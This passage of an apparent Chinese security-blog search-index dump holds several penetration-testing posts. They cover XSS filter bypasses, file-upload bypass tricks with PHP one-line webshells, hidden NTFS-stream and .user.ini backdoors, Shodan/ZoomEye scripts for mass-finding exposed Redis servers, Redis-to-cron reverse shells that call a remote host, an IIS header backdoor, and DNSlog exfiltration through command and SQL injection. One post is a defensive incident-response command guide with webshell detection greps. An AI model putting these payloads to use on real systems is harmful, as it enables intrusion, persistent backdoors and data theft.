直接列举目录realpath列举目录SplFileInfo::getRealPath列举目录GD库imageftbbox/imagefttext列举目录bindtextdomain暴力猜解目录 XSS绕过123456789. 可以用 withonerror 可以用 onblur oncutwindow 可以用 top parent selfal%00ert``\x0A\x0D 可以用 \x2028\x2029base64解码函数atob()&quot;oncut=_=window;_.onerror=_[&quot;al&quot;+&quot;ert&quot;];throw[1]&quot;oncut=location=&quot;javascript:aler&quot;+&quot;t%&quot;+&quot;281%&quot;+&quot;29]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>XSS</tag>
        <tag>WAF绕过</tag>
        <tag>PHP</tag>
        <tag>webshell</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件上传(绕过)]]></title>
    <url>%2F2017%2F02%2F21%2F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E7%BB%95%E8%BF%87%2F</url>
    <content type="text"><![CDATA[根据个人经验,搜集总结，欢迎大牛们补充、纠错 -_- 文件上传校验姿势 客户端javascript校验（一般只校验后缀名） 服务端校验 文件头content-type字段校验（image/gif） 文件内容头校验（GIF89a） 后缀名黑名单校验 后缀名白名单校验 自定义正则校验 WAF设备校验（根据不同的WAF产品而定） 文件上传绕过校验姿势 客户端绕过（抓包改包） 服务端绕过 文件类型 文件头 文件后缀名 配合文件包含漏洞绕过 配合服务器解析漏洞绕过 CMS、编辑器漏洞绕过 配合操作系统文件命名规则绕过 配合其他规则绕过 WAF绕过 黑名单绕过 白名单绕过 1.客户端绕过可以利用burp等抓包改包，先上传一个gif类型的木马，然后通过burp将其改为asp/php/jsp后缀名即可。 2.服务端绕过2.1 文件类型绕过我们可以通过抓包，将content-type字段改为image/gif 2.2 文件头绕过在木马文件内容开头加上一些文件头信息 GIF89a&lt;?php phpinfo(); ?&gt; 判断文件头内容是否符合要求，这里举几个常见的文件头对应关系：1234（1） .JPEG;.JPE;.JPG，”JPGGraphic File”（2） .gif，”GIF 89A”（3） .zip，”Zip Compressed”（4） .doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile” 2.3 文件名/后缀绕过2.3.1 截断test.php%00.jpg,test.php0xoo.jpg 2.3.2 windows特性123456789ADS流：test.php::$DATA(见下)test.php.test.php_test.php(空格)*=.&lt;=*&gt;=?test.&lt;&lt;&lt;test.php:1.jpg会生成一个test.php的空文件 2.3.3 ASP1234567891011121314解析漏洞:.asp;.jpg.asp.jpg.asp;jpg+111.asp;+222.jpg/111.asp/1.jpg/111.aspx/1.jpg后缀名：asa,cer,cdx,ashx,asmx,xml,htr,asax双文件扩展：test.asp.jpgRTLO：asp.html-内容为一句话php.txt-内容为一句话 2.3.4 JSP12.jsp.jpg.jsp-用两个jsp包围中间的jpg后缀名：jspf,jspa,jsps 2.3.5 PHP1234567891011121314后缀名：.php3 ,.php5,.php7大小写：pHp解析漏洞：1.php.jpg1.jpg.php1.php jpg(jpg前面两个空格)1.php jpg(jpg前面一个空格)/1.jpg/1.php/1.jpg%00.php/1.jpg/.php/1.jpg/php特殊文件利用：.htaccess.user.ini 3.配合文件包含漏洞 上传一个符合条件格式的文档，文档内容为一句话木马，eg：test.txt 利用文件包含漏洞包含上传的木马文件,eg:page?id=D:/www/test.txt 4.配合服务器解析漏洞123456789101112131415161718IIS5.x-6.x:目录解析(6.0):/1.asp/1.jpg文件解析:1.asp;.jpg文件类型:1.asa,a.cer,1.cdxIIS7.5：IIS7.5是由于php配置文件中，开启了cgi.fix_pathinfApache:从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断后缀不识别：1.php.php123配置错误：1.php.jpgNginx：Nginx默认是以CGI的方式支持PHP解析的，和IIS7.5一样开启了cgi.fix_pathinf1.jpg/1.php1.jpg%00.php1.jpg/%20\1.php上传一个名字为test.jpg，以下内容的文件&lt;?PHP fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php eval($_POST[caidao])?&gt;&apos;);?&gt;然后访问test.jpg/.php,在这个目录下就会生成一句话木马shell.php 5.配合操作系统文件命令规则 上传不符合windows文件命名规则的文件名 123456test.asp.test.asp(空格)test.php:1.jpgtest.php::$DATAshell.php::$DATA…….会被windows系统自动去掉不符合规则符号后面的内容。 linux下后缀名大小写在linux下，如果上传php不被解析，可以试试上传pHp后缀的文件名。 6.CMS、编辑器漏洞 CMS漏洞：针对不同CMS存在的上传漏洞进行绕过。 编辑器漏洞：比如FCK，Ewebeditor等，可以针对编辑器的漏洞进行绕过。 7.其他规则7.1 利用waf特性 在恶意代码前加垃圾数据； 在数据包前加垃圾数据； 在Content-Disposition参数后面加垃圾数据； 多加一个filename； 更改HTTP请求方法； 删除实体里面的Conten-Type字段； 第一种是删除Content整行，第二种是删除C后面的字符。删除掉ontent-Type: image/jpeg只留下c，将.php加c后面即可，但是要注意额，双引号要跟着c.php。 删除Content-Disposition字段里的空格 增加一个空格 修改Content-Disposition字段值的大小写 文件名后缀处回车 多个Content-Disposition7.2 利用NTFS ADS特性ADS是NTFS磁盘格式的一个特性，用于NTFS交换数据流。12345test.php:a.jpg 生成test.php 空test.php::$INDEX_ALLOCATION 生成test.php文件夹 test.php::$DATA\1.jpg 生成1.jpg(不可见的)echo ^&lt;?php @eval(request[caidao])?^&gt; &gt; index.php:hidden.jpg这样子就生成了一个不可见的shell hidden.jpg，常规的文件管理器、type命令，dir命令、del命令发现都找不出那个hidden.jpg的。我们可以在另外一个正常文件里把这个ADS文件include进去，&lt;?php include(‘index.php:hidden.jpg’)?&gt;，这样子就可以正常解析我们的一句话了 7.3 利用RTLO1234新建一个文件php.html内容为：&lt;?php @eval($_POST[&apos;caidao&apos;]);?&gt;重命名文件：输入名字的文本框里点右键，选择“插入unicode控制字符”，然后就到了这个菜单栏，我们选择RLO这个时候php.html已经变成了html.php了 7.4 特殊的长文件名绕过文件名使用非字母数字，比如中文等最大程度的拉长shell.asp;王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王.jpg 7.5 反删除将name=&quot;file1&quot;改成了file4，可以防止文件删除（JCMS漏洞） 7.8 图片转换/二次渲染/文件幻数检测 在不破坏文件本身渲染情况下，在空白区进行代码填充，一般是图片注释 溢出攻击 绕过GD库 …]]></content>
      <tags>
        <tag>WAF绕过</tag>
        <tag>PHP</tag>
        <tag>文件上传</tag>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[应急响应资料整理]]></title>
    <url>%2F2017%2F02%2F13%2F%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%B5%84%E6%96%99%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[趁着最近不是很忙，整理了下最近学习的一些应急响应的一些命令、资料，方便以后查看，有什么问题还望指出，多多交流！ 0.0 怎么做应急响应？具体怎么做应急响应，根据网上应急响应的经验总结几点： 确定攻击时间 查找攻击线索 梳理攻击流程 实施解决方案 定位攻击者 123451、确定攻击时间能够帮助我们缩小应急响应的范围，有助于我们提高效率，2、查找攻击线索，能够让我们知道攻击者都做了什么事情，3、梳理攻击流程则是还原整个攻击场景，4、实施解决方案就是修复安全漏洞，切断攻击途径，5、最后就是定位攻击人，则是取证。 常用命令全是套路，但一般很有用1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465661、备份系统日志及默认的httpd服务日志linux:tar -cxvf secure_logs.tar.gz /var/log/securetar -cxvf messages_logs.tar.gz /var/log/messegestar -cxvf httpd_logs.tar.gz /var/log/httpd/windows:应用程序日志、系统日志、安全日志；默认情况下，如果系统不对事件做审核则不会生成安全日志。开始→设置→控制面板→管理工具→事件查看器Windows日志文件默认位置是%systemroot%\system32\config 安全日志文件：%systemroot%\system32\config \SecEvent.EVT 系统日志文件：%systemroot%\system32\config \SysEvent.EVT 应用程序日志文件：%systemroot%\system32\config \AppEvent.EVT FTP连接日志和HTTPD事务日志：%systemroot% \system32\LogFiles\ IIS日志默认存放在System32\LogFiles目录下，使用W3C扩展格式2、备份last可以查看登录信息(登录时间能不能跟运维人员时间对上)last &gt; last.log3、查询utmp文件并显示当前系统中每个用户和它所运行的进程信息w &gt; w.log4、系统服务备份chkconfig --list &gt; services.log5、查看可疑进程 linux：ps -aux或ps -ef 查看进程文件路径、pid号（一般ps -ef能比较清晰的看出反弹shell）ps -aux的结果比较杂乱,pstree -a的结果比较简单明了lsof -i :port 检查哪个进程使用这个端口lsof -p 1234 检查pid号为1234进程调用情况strace -f -p 1234 跟踪分析pid号为1234的进程windows：tasklist taskkill6、监听端口备份(查看端口及对应服务对外开放情况)linux: netstat -antup &gt; port-listen.logwindows: netstat -ano &gt; port-listen.log7、查看用户信息linux： cat /etc/passwdwindows： net user8、查找最近5天内更改的文件find /home/work -type f -mtime -59、Rootkit查找linux: Rootkit Hunter、chkrootkitwindows: 勒索软件终结者10、查看服务占用资源情况top &gt; top.log11、查看计划任务(很多后门程序通过crontab完成自启)linux： crontab -l不过有时候crontab -l并不能解决问题，通常还要做如下操作：cd /etc/crontablscrontab -r 删除计划任务windows： 管理-&gt;任务计划程序-&gt;任务计划程序库12、查看有没有提权痕迹cat /etc/passwd 极有可能其他用户出现id，组id 0、0的情况lsof -g gid号 通常能找到恶意文件关联的lib文件13、显示最后登录系统的倒数10条记录last -1014、查看执行过什么命令cat ~/.bash_historyhistory | grep &apos;2017-2-12&apos; 根据时间查看干了什么history | tail -n 5 显示最近5次执行的命令history -c 清空history历史15、查找777的权限的文件find / *.jsp -perm 77716、网络连接查看与该ip链接的进程及文件路径、pid号netstat -anp| grep 8.8.8.8 linuxnetstat -ano|find &quot;8.8.8.8&quot; windows WEB方式入侵主要通过web应用程序、strust2、数据库等其他高危漏洞例如apache12345678910111213141516171819apache的默认重要配置信息如下：配置文件：`/etc/httpd/conf/http.conf`服务器的根目录：`/var/www/html`访问日志文件：`/var/log/httpd/access_log`错误日志文件：`/var/log/httpd/error_log`运行apache的用户：apache模块存放路径：`/usr/lib/httpd/modules`1、查看日志文件2、根据日志文件信息定位恶意文件位置3、`stat`记录恶意文件信息4、找到恶意进程比如恶意进程名是fu4k5、进入proc/对应pid目录/fdps -aux | grep fu4kcd /proc/fu4k/fd在/usr/bin目录下，stat信息：stat /usr/bin/fu4k6、查找系统中包含指定字符的所有文件（可以拿已知shell密码及特定字符作为关键字）find /|xargs grep -ri &quot;caidao&quot; -l 2&gt; webshell.log（执行后会改变所有文件的atime） 非web方式入侵主要通过bash其他高危服务，大多属于ssh(22)、vnc(5900)对外且弱口令的情况，主要结合syslog/var/log/message.*判断123456781、判断服务器是否支持访问外网，如支持，通过netstat –an查看是否已与外部可疑服务器建立连接，如已建立需及时断开2、记录后门文件stat信息，根据mtime查找其他后门文件，同时根据文件属组与属组对应运行服务判断入侵方式3、如果权限组为root，需要检测是否被种rootkit4、非web类后门，大部分人习惯把恶意文件放置在`/tmp`目录下；5、通过可疑进程名与cpu占用率排查，有些后门会伪装正常进程名；使用`top`命令查看cpu占用率，找出后门进程6、获取进程pid后可cd到`/proc/对应pid/fd7、查看是否有相关计划任务，后门程序为保证自启动往往会添加新的计划任务 入侵后需要被关注的文件linux:123456789101112131415161718192021222324252627282930/var/log/messages — 包括整体系统信息，其中也包含系统启动期间的日志。此外，mail，cron，daemon，kern和auth等内容也记录在var/log/messages日志中。/var/log/dmesg — 包含内核缓冲信息（kernel ring buffer）。在系统启动时，会在屏幕上显示许多与硬件有关的信息。可以用dmesg查看它们。/var/log/auth.log — 包含系统授权信息，包括用户登录和使用的权限机制等。/var/log/boot.log — 包含系统启动时的日志。/var/log/daemon.log — 包含各种系统后台守护进程日志信息。/var/log/dpkg.log – 包括安装或dpkg命令清除软件包的日志。/var/log/kern.log – 包含内核产生的日志，有助于在定制内核时解决问题。/var/log/lastlog — 记录所有用户的最近信息。这不是一个ASCII文件，因此需要用lastlog命令查看内容。/var/log/maillog /var/log/mail.log — 包含来着系统运行电子邮件服务器的日志信息。例如，sendmail日志信息就全部送到这个文件中。/var/log/user.log — 记录所有等级用户信息的日志。/var/log/Xorg.x.log — 来自X的日志信息。/var/log/alternatives.log – 更新替代信息都记录在这个文件中。/var/log/btmp – 记录所有失败登录信息。使用last命令可以查看btmp文件。例如，”last -f /var/log/btmp | more“。/var/log/cups — 涉及所有打印信息的日志。/var/log/anaconda.log — 在安装Linux时，所有安装信息都储存在这个文件中。/var/log/yum.log — 包含使用yum安装的软件包信息。/var/log/cron — 每当cron进程开始一个工作时，就会将相关信息记录在这个文件中。/var/log/secure — 包含验证和授权方面信息。例如，sshd会将所有信息记录（其中包括失败登录）在这里。/var/log/wtmp或/var/log/utmp — 包含登录信息。使用wtmp可以找出谁正在登陆进入系统，谁使用命令显示这个文件或信息等。/var/log/faillog – 包含用户登录失败信息。此外，错误登录命令也会记录在本文件中。除了上述Log文件以外， /var/log还基于系统的具体应用包含以下一些子目录：/var/log/httpd/或/var/log/apache2 — 包含服务器access_log和error_log信息。/var/log/lighttpd/ — 包含light HTTPD的access_log和error_log。/var/log/mail/ – 这个子目录包含邮件服务器的额外日志。/var/log/prelink/ — 包含.so文件被prelink修改的信息。/var/log/audit/ — 包含被 Linux audit daemon储存的信息。/var/log/samba/ – 包含由samba存储的信息。/var/log/sa/ — 包含每日由sysstat软件包收集的sar文件。/var/log/sssd/ – 用于守护进程安全服务。~/.bash_history 至关重要的日志，往往黑客会使用history -c清理相关的日志 入侵后web服务器日志分析web服务器的种类很多，接触比较多的为apache、tomcat、nagix为主。无论任何web服务器其实日志需要关注的东西是一致的，即access_log和error_log。查看哪些IP在暴力破解root123grep &quot;Failed password for root&quot; /var/log/auth.log | awk &apos;&#123;print $11&#125;&apos; | sort | uniq -c | sort -nr | morecat /var/log/messeges|grep rootcat /var/log/messages |grep &apos;root from&apos; | wc -l 查看爆破次数 一般确定ip地址后，通过:123find . access_log |grep xargs ip攻击地址find . access_log| grep xargs 木马文件名tail -F /var/log/httpd/error_log | grep ip攻击地址 动态查看日志 通过access_log和error_log中的数据我们一般能明确以下几件事情： 文件是什么时刻上传的，应急响应中确定攻击发生的攻击点十分重要。通过时间点可以有效的查找加密木马，隐蔽的后门等。 攻击的IP地址是多少，当然一般情况是跳板地址T_T 传了什么文件上来 筛选指定IP访问的URL，并按照访问数量排序cat access.log |grep &quot;192.168.11.37&quot; | awk &#39;{print $7}&#39; | sort | uniq -c |sort -nr筛选出访问状态码是500的所有IP地址，并按照访问次数排序cat access.log |grep &quot;HTTP/1.1\&quot; 500&quot; | awk &#39;{print $1}&#39; | sort | uniq -c |sort -nr 筛选/var/log/secure日志找到爆破ssh的ipcat /var/log/secure |grep &#39;Accepted password&#39;查看cron日志1234/etc/cron.hourly/cron.sh/etc/cron.hourly/udev.sh查看第一次计划任务时间：cat /var/log/cron |grep &apos;恶意文件名&apos;|sort|head windows:1234567x:\RECYCLER\C:\Documents and Settings\c:\users\c:\windows\temp\IIS的默认上传目录日志分析工具：[Web日志安全分析工具 v2.0.exe]() 应用系统日志1234MySQL; 在mysql.log找错误消息，看看有没有结构损坏的表， 是否有innodb修复进程在运行，是否有disk/index/query 问题.PHP-FPM; 如果设定了 php-slow 日志, 直接找错误信息 (php, mysql, memcache, …)。Varnish; 在varnishlog 和 varnishstat 里, 检查 hit/miss比. 看看配置信息里是否遗漏了什么规则，使最终用户可以直接攻击你的后端？HA-Proxy; 后端的状况如何？健康状况检查是否成功？是前端还是后端的队列大小达到最大值了？ 入侵后恶意文件查找1234567891011121314151617181920212223find -mtime -2 -type f -name \*.php 查找近2天被修改过的文件find /app -user root 查找app目录下属于root用户的文件查找存在制定关键字的恶意脚本木马find ./ -name &quot;*.php&quot; |xargs egrep &quot;phpspy|c99sh|milw0rm|eval\(gunerpress|eval\(base64_decode|spider_bc&quot;&gt; /tmp/php.txtgrep -r --include=*.php &apos;[^a-z]eval($_POST&apos; . &gt; /tmp/eval.txtgrep -r --include=*.php &apos;file_put_contents(.*$_POST\[.*\]);&apos; . &gt; /tmp/file_put_contents.txtfind ./ -name &quot;*.php&quot; -type f -print0 | xargs -0 egrep &quot;(phpspy|c99sh|milw0rm|eval\(gzuncompress\(base64_decode|eval\(base64_decode|spider_bc|gzinflate)&quot; | awk -F: &apos;&#123;print $1&#125;&apos; | sort | uniqlinux 下webshell查杀：find /www/ -name &quot;*.php&quot; |xargs egrep &apos;assert|phpspy|c99sh|milw0rm|eval|\(gunerpress|\(base64_decoolcode|spider_bc|shell_exec|passthru|\(\$\_\POST\[|eval \(str_rot13|\.chr\(|\$\&#123;\&quot;\_P|eval\(\$\_R|file_put_contents\(\.\*\$\_|base64_decode&apos;查杀脚本：[webshell查杀脚本.py]()[webshellkill_linux.py]()rootkit查找windows下：[PC Hunter]http://www.xuetr.com/)[PowerTool] (http://about.me/ithurricanept)linux下：[Rootkit Hunter](http://rkhunter.sourceforge.net/)常规后门查找shift后门等[D盾_Web查杀](http://d99net.net/News.asp?id=62)[Safe3 WebShell Scanner](http://www.273tech.com/works/884981847/view.htm)[暗组Web杀毒 2.6](http://forum.cnsec.org/thread-93025-1-1.html) 其他方面检测 网络相关 异常流量 DDOS ARP DNS 数据库 常见问题关键文件设置使用chattr命令防止系统中某个关键文件被修改：chattr +i /etc/resolv.conf查看使用：lsattr /etc/resolv.conf会显示如下属性 —-i——– /etc/resolv.conf 要想修改此文件就要把i属性去掉： chattr -i /etc/resolv.conf让某个文件只能往里面追加数据，但不能删除(用于各种日志文件上)：chattr +a /var/log/messages系统命令被替换 1、可以选择重新还原回去:yum install e2fsprogs;2、也可以使用系统命令工具包busybox，最后busybox 要还原的命令 -i日志查看/var/log/secure日志可以查看Accept关键字;查找访问和错误日志, 直接找5xx错误, 再看看是否有limit_zone错误; 日志文件恢复linux下日志文件恢复可使用lsof恢复删除的日志文件(前提是不能关闭服务器，不能关闭相关服务或进程)12lsof | grep access_logcat /proc/$PID/fd/$文件描述符 &gt; /var/log/httpd/access_log 部分命令无法执行 当用户环境变量配置不当时，部分命令无法直接执行，需要在命令之前加上路径，如：/etc/sbin/ifconfig]]></content>
      <tags>
        <tag>运维</tag>
        <tag>渗透测试</tag>
        <tag>自动化</tag>
        <tag>webshell</tag>
        <tag>linux</tag>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于MongoDB未授权访问的学习]]></title>
    <url>%2F2017%2F01%2F13%2F%E5%85%B3%E4%BA%8EMongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E7%9A%84%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[最近MongoDB的未授权访问不知道为啥，就是这样突然火了，其实你要是留意的话，其实在2014年的时候就已经有人在乌云刷过这个了，其实很简单，就是没密码，然后暴露到公网上喽。 本次主要做一些redis的一个测试，刚好最近再开发一个系统，刚好写几个脚本做插件，也提高下工作效率。 具体漏洞细节请参考：redis未授权访问 然后利用ZoomEye和Shodan API进行条件批量筛选 ZoomEye：https://api.zoomeye.org/host/search?query=&quot;关键词&quot;&amp;page=Shodan：pip install shodan Shodan python脚本如下：123456789101112131415161718192021222324252627282930313233343536#!/usr/bin/python# -*- coding: UTF-8 -*-&apos;&apos;&apos;@Author：w2n1ck@博客：http://byd.dropsec.xyz/&apos;&apos;&apos;import shodanimport osiplist = []ip_list = []shodan_ip_list = []def shodanSearch(keywords): SHODAN_API_KEY = &quot;your key&quot; api = shodan.Shodan(SHODAN_API_KEY) total = 0 try: results = api.search(keywords) total = int(results[&apos;total&apos;]) for result in results[&apos;matches&apos;]: #iplist.append(&#123;&quot;ip&quot;:result[&apos;ip_str&apos;],&quot;country&quot;:result[&apos;location&apos;][&apos;country_name&apos;]&#125;) iplist.append(result[&apos;ip_str&apos;]) for i in range(len(iplist)): ip_list = iplist[i].encode(&apos;utf-8&apos;) shodan_ip_list.append(ip_list) s = &apos;\n&apos;.join(shodan_ip_list) with open(&apos;shodan_ip_list.txt&apos;,&apos;w&apos;) as output: output.write(s) except shodan.APIError, e: print &apos;Error: %s&apos; % eif __name__ == &apos;__main__&apos;: shodanSearch(&apos;redis&apos;) ZoomEye python脚本如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485#!/usr/bin/python# -*- coding: UTF-8 -*-&apos;&apos;&apos;@Author：w2n1ck@博客：http://byd.dropsec.xyz/&apos;&apos;&apos;import osimport requestsimport jsonaccess_token = &apos;&apos;ip_list = []def login(): user = raw_input(&apos;[-] input : username :&apos;) passwd = raw_input(&apos;[-] input : password :&apos;) data = &#123; &apos;username&apos; : user, &apos;password&apos; : passwd &#125; data_encoded = json.dumps(data) # dumps 将 python 对象转换成 json 字符串 try: r = requests.post(url = &apos;https://api.zoomeye.org/user/login&apos;,data = data_encoded) r_decoded = json.loads(r.text) # loads() 将 json 字符串转换成 python 对象 global access_token access_token = r_decoded[&apos;access_token&apos;] except Exception,e: print &apos;[-] info : username or password is wrong, please try again &apos; exit()def saveStrToFile(file,str): with open(file,&apos;w&apos;) as output: output.write(str)def saveListToFile(file,list): s = &apos;\n&apos;.join(list) with open(file,&apos;w&apos;) as output: output.write(s)def apiTest(): page = 1 global access_token with open(&apos;access_token.txt&apos;,&apos;r&apos;) as input: access_token = input.read() # 将 token 格式化并添加到 HTTP Header 中 headers = &#123; &apos;Authorization&apos; : &apos;JWT &apos; + access_token, &#125; print headers while(True): try: r = requests.get(url = &apos;https://api.zoomeye.org/host/search?query=&quot;redis&quot;&amp;page=&apos; + str(page), headers = headers) &apos;&apos;&apos; 因为我们进行的是主机搜索，所以请求的接口为: https://api.zoomeye.org/host/search?query=&quot;yoursring&quot;&amp;facet=app,os&amp;page= 如果进行web搜索，请求接口为: https://api.zoomeye.org/web/search?query=&quot;port:21&quot;&amp;page= ?query为要搜索的关键字 &apos;&apos;&apos; r_decoded = json.loads(r.text) # print r_decoded # print r_decoded[&apos;total&apos;] for x in r_decoded[&apos;matches&apos;]: print x[&apos;ip&apos;] ip_list.append(x[&apos;ip&apos;]) print &apos;[-] info : count &apos; + str(page * 10) except Exception,e: # 若搜索请求超过 API 允许的最大条目限制 或者 全部搜索结束，则终止请求 if str(e.message) == &apos;matches&apos;: print &apos;[-] info : account was break, excceeding the max limitations&apos; break else: print &apos;[-] info : &apos; + str(e.message) else: if page == 10: break page += 1def main(): # 访问口令文件不存在则进行登录操作 if not os.path.isfile(&apos;access_token.txt&apos;): print &apos;[-] info : access_token file is not exist, please login&apos; login() saveStrToFile(&apos;access_token.txt&apos;,access_token) apiTest() saveListToFile(&apos;zoomeye_ip_list.txt&apos;,ip_list)if __name__ == &apos;__main__&apos;: main() 把要搜索的关键词改一下即可批量获取符合条件的主机地址： 然后就是redis的批量验证脚本,GitHub上有一个hackredis脚本能够验证redis未授权访问，然后批量登陆到ssh，但是我搜的，可能人品太差，一个都没登陆上，可能不对公网开放SSH服务了或者做了IP限制。 然后就换个思路，我们写入的密钥，会覆盖这个文件authorized_keys，如果原来服务器上管理员是使用过公钥的方法登陆就会导致管理员的公钥失效，容易被管理员发现。直接在redis下写个shell，种个后门，再加个rootkit，岂不是神不知道鬼不觉[斜眼] redis反弹shell： CentOS 1234567891011echo -e &quot;\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/远程主机/2333 0&gt;&amp;1\n\n&quot;|redis-cli -h 目标机 -x set 1config set dir /var/spool/cronokconfig set dbfilename rootoksaveok然后vps上nc监听nc -lvv 2333 Ubuntu如果是ubuntu的系统，是不能用bash弹shell的，可以使用python来反弹。 1echo -e &quot;\n\n*/1 * * * * /usr/bin/python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;10.0.0.1\&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&apos;\n\n&quot; 附加个建议：12345678可以配置redis.conf这个文件，在redis-3.2.0目录下#默认只对本地开放bind 127.0.0.1#添加登陆密码requirepass appleu0#在需要对外开放的时候修改默认端口port 2333#最后还可以配合iptables限制开放]]></content>
      <tags>
        <tag>运维</tag>
        <tag>渗透测试</tag>
        <tag>Python</tag>
        <tag>自动化</tag>
        <tag>Redis</tag>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ini和iis后门]]></title>
    <url>%2F2017%2F01%2F03%2Fini%E5%92%8Ciis%E5%90%8E%E9%97%A8%2F</url>
    <content type="text"><![CDATA[最近看了两个关于ini和利用iis本身机制的后门。 ini后门.user.ini它比.htaccess用的更广，不管是nginx/apache/IIS，只要是以fastcgi运行的php都可以用这个方法。 .user.ini实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。和php.ini不同的是，.user.ini是一个能被动态加载的ini文件。也就是说我修改了.user.ini后，不需要重启服务器中间件，只需要等待user_ini.cache_ttl所设置的时间（默认为300秒），即可被重新加载 利用方法 新建.user.ini，内容为： 1auto_prepend_file=test.gif 新建test.gif，内容为： 123&lt;?php @eval($_REQUEST[shell]);?&gt; 新建echo.php,内容为： 123&lt;?phpecho &quot;PHP is very good!&quot;;?&gt; 访问echo.php即可看到后门： 1http://127.0.0.1:8080/php-backdoor/echo.php?shell=phpinfo(); iis后门iis后门是用了iis本身的机制，当在http头里增加一字段即可触发后门，并执行发过来的命令。 正常情况：123456789101112131415161718192021GET /pwet.htm HTTP/1.1Host: 192.168.73.143Accept-Encoding: identityConnection: Keep-AliveContent-type: application/x-www-form-urlencodedAccept: */*HTTP/1.1 200 OKDate: Thu, 03 Feb 2011 12:16:50 GMTContent-Length: 31Content-Type: text/htmlLast-Modified: Mon, 21 Jun 2010 11:53:19 GMTAccept-Ranges: bytesETag: &quot;963779573811cb1:994&quot;Server: Microsoft-IIS/6.0&lt;html&gt;Pouetpouet&lt;/html&gt; 加入恶意字段123456789101112131415161718192021222324252627282930313233343536373839GET /pwet.htm HTTP/1.1Host: 192.168.73.143Accept-Encoding: identityX-Order: ListDirConnection: Keep-AliveX-Data: QzpcContent-type: application/x-www-form-urlencodedAccept: */*HTTP/1.1 200 OKDate: Thu, 03 Feb 2011 12:16:57 GMTContent-Length: 353X-Resp: OKContent-Type: text/htmlLast-Modified: Mon, 21 Jun 2010 11:53:19 GMTAccept-Ranges: bytesETag: &quot;963779573811cb1:994&quot;Server: Microsoft-IIS/6.0&lt;html&gt;Pouetpouet&lt;/html&gt;[F] C:\AUTOEXEC.BAT[F] C:\boot.ini[F] C:\bootfont.bin[F] C:\CONFIG.SYS[D] C:\Documents and Settings[D] C:\Inetpub[F] C:\IO.SYS[F] C:\MSDOS.SYS[F] C:\NTDETECT.COM[F] C:\ntldr[F] C:\pagefile.sys[D] C:\Program Files[D] C:\System Volume Information[D] C:\WINDOWS[D] C:\wmpub]]></content>
      <tags>
        <tag>WAF绕过</tag>
        <tag>PHP</tag>
        <tag>webshell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试小技巧之DNSlog]]></title>
    <url>%2F2016%2F12%2F04%2Fdnslog%E5%88%A9%E7%94%A8%2F</url>
    <content type="text"><![CDATA[在渗透环境时，我们经常会遇到疑似命令执行还有些bool注入和延时注入，但是都没有回显。 命令执行我们可能会用各种各样的请求来判断是否存在命令执行，对于bool注入和延时注入这两种注入类型的缺点就是速度慢，效率低，一个是基于对错判断数据，一个是基于访问时间来判断数据，dnslog的出现就正好弥补了这样的缺陷。 0x00 原理这里参考一篇paper ,一个大牛的详细解释:DNS in SQL Injection Attacks 简单说就是：DNSLog 用于监测 DNS 和 HTTP 访问记录，可通过HTTP请求，让目标主机主动请求 DNSLog API 地址，有相应的解析记录，则可判定为存在相应的漏洞。 0x01 利用首先给大家分享一个免费的dnslog平台(ps:要是有cloudeye激活码的可以忽略)。 平台会给每一个会员分一个二级域名，xxx.ceye.io。 简单的来说，dnslog平台自己保留dns的日志信息，并对应每个会员一个二级域名，这样我们可以通过 ping test.xxxxx.ceye.io 这样的多级域名方式，把我们需要返回的信息链接到url中，然后分析日志，test部分就是我们得到的信息。 0x01.1 命令执行在我们找到命令执行漏洞的时候，我们可以执行这样的命令判断 12345linux:curl http://ip.port.domain.ceye.io/`whoami`ping `whoami`.ip.port.domain.ceye.iowindows:ping %USERNAME%.domain.ceye.io 这时候就可以去dnslog瓶体查看到信息 0x01.2 SQL注入SQL Server存储程序master..xp_dirtree（）用于获取所有文件夹的列表和给定文件夹内部的子文件夹。12345678DECLARE @host varchar(1024);注册一个名为@host的变量，类型为varchar。SELECT @host=CONVERT(varchar(1024),db_name())+&apos;.xxxxxxxxx.ceye.io&apos;;获取db_name()然后转换成varchar类型，然后吧获取的db_name()返回值拼接到dnslog平台给我们的子域名里面，然后赋值给@host变量。EXEC(&apos;master..xp_dirtree &quot;\\&apos;+@host+&apos;\foobar$&quot;&apos;);列远程主机的foobar$目录,由于是远程主机，所以会做一个dns解析，这样我们的dns平台就能得到日志了http://xxxx.com.cn/?Id=123&apos;;DECLARE @host varchar(1024);SELECT @host=CONVERT(varchar(1024),db_name())+&apos;.xxxxxxxxx.ceye.io&apos;;EXEC(&apos;master..xp_dirtree &quot;\\&apos;+@host+&apos;\foobar$&quot;&apos;);-- OracleUTL_INADDR包用于互联网的寻址–诸如检索本地和远程主机的主机名和IP的地址12345SELECT UTL_INADDR.GET_HOST_ADDRESS(&apos;ip.port.b182oj.ceye.io&apos;);SELECT UTL_HTTP.REQUEST(&apos;http://ip.port.b182oj.ceye.io/oracle&apos;) FROM DUAL;SELECT 